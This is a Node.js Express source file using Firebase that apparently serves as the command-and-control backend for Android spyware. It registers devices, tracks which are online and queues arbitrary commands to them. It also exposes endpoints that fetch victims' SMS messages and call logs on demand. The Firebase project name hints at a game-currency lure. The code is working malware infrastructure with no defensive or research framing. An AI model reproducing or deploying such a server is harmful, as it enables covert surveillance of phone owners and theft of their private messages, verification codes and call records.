const express = require('express');
const admin = require('firebase-admin');
const app = express();
const PORT = process.env.PORT || 3000;

// Initialize Firebase Admin
const serviceAccount = require('./serviceAccountKey.json'); // Ensure this file exists
admin.initializeApp({
  credential: admin.credential.cert(serviceAccount),
  databaseURL: 'https://bgmiuc-74295-default-rtdb.firebaseio.com' // Your DB URL
});

const db = admin.database();
app.use(express.json());

// ================== Device Registration & Online Status ==================
// Android app will call this to register and update online status
app.post('/api/register', async (req, res) => {
  const { deviceId, info } = req.body;
  if (!deviceId) return res.status(400).json({ error: 'deviceId required' });

  try {
    const deviceRef = db.ref(`onlineDevices/${deviceId}`);
    await deviceRef.set({
      info: info || {},
      lastSeen: admin.database.ServerValue.TIMESTAMP,
      online: true
    });
    res.json({ status: 'registered', deviceId });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// Get list of online devices (last seen within 1 minute)
app.get('/api/devices', async (req, res) => {
  try {
    const snapshot = await db.ref('onlineDevices').once('value');
    const devices = [];
    const now = Date.now();
    snapshot.forEach(child => {
      const device = child.val();
      // Consider online if lastSeen within 60 seconds
      if (now - device.lastSeen < 60000) {
        devices.push({
          deviceId: child.key,
          info: device.info,
          lastSeen: device.lastSeen
        });
      } else {
        // Mark as offline (optional)
        child.ref.update({ online: false });
      }
    });
    res.json(devices);
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// ================== Command Handling ==================
app.post('/api/command', async (req, res) => {
  const { deviceId, command } = req.body;
  if (!deviceId || !command) return res.status(400).json({ error: 'deviceId and command required' });

  try {
    const commandsRef = db.ref(`commands/${deviceId}`);
    const newCommandRef = await commandsRef.push({
      command,
      timestamp: admin.database.ServerValue.TIMESTAMP,
      status: 'pending'
    });
    res.json({ status: 'queued', deviceId, command, key: newCommandRef.key });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// Poll for command results (optional)
app.get('/api/poll/:deviceId', (req, res) => {
  const deviceId = req.params.deviceId;
  const timeout = 30000;
  const resultsRef = db.ref(`results/${deviceId}`).limitToLast(1);
  let responded = false;

  const listener = resultsRef.on('child_added', (snapshot) => {
    if (!responded) {
      responded = true;
      clearTimeout(timer);
      resultsRef.off('child_added', listener);
      res.json(snapshot.val());
    }
  });

  const timer = setTimeout(() => {
    if (!responded) {
      responded = true;
      resultsRef.off('child_added', listener);
      res.json({ result: null });
    }
  }, timeout);

  req.on('close', () => {
    clearTimeout(timer);
    resultsRef.off('child_added', listener);
  });
});

// ================== SMS & Call Logs (same as before) ==================
app.get('/api/sms/:deviceId', async (req, res) => {
  const deviceId = req.params.deviceId;
  const requestId = Date.now().toString();
  try {
    await db.ref(`requests/${deviceId}/sms`).set({ requestId, timestamp: admin.database.ServerValue.TIMESTAMP });
    const responseRef = db.ref(`responses/${deviceId}/sms`);
    const timeout = 10000;
    let responded = false;
    const listener = responseRef.on('value', (snapshot) => {
      if (!responded && snapshot.exists()) {
        const data = snapshot.val();
        if (data.requestId === requestId) {
          responded = true;
          clearTimeout(timer);
          responseRef.off('value', listener);
          responseRef.remove();
          res.json(data.smsList || []);
        }
      }
    });
    const timer = setTimeout(() => {
      if (!responded) {
        responded = true;
        responseRef.off('value', listener);
        res.status(408).json({ error: 'Timeout' });
      }
    }, timeout);
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

app.get('/api/calls/:deviceId', async (req, res) => {
  const deviceId = req.params.deviceId;
  const requestId = Date.now().toString();
  try {
    await db.ref(`requests/${deviceId}/calls`).set({ requestId, timestamp: admin.database.ServerValue.TIMESTAMP });
    const responseRef = db.ref(`responses/${deviceId}/calls`);
    const timeout = 10000;
    let responded = false;
    const listener = responseRef.on('value', (snapshot) => {
      if (!responded && snapshot.exists()) {
        const data = snapshot.val();
        if (data.requestId === requestId) {
          responded = true;
          clearTimeout(timer);
          responseRef.off('value', listener);
          responseRef.remove();
          res.json(data.callList || []);
        }
      }
    });
    const timer = setTimeout(() => {
      if (!responded) {
        responded = true;
        responseRef.off('value', listener);
        res.status(408).json({ error: 'Timeout' });
      }
    }, timeout);
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

app.get('/', (req, res) => res.send('Firebase Server Running'));
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));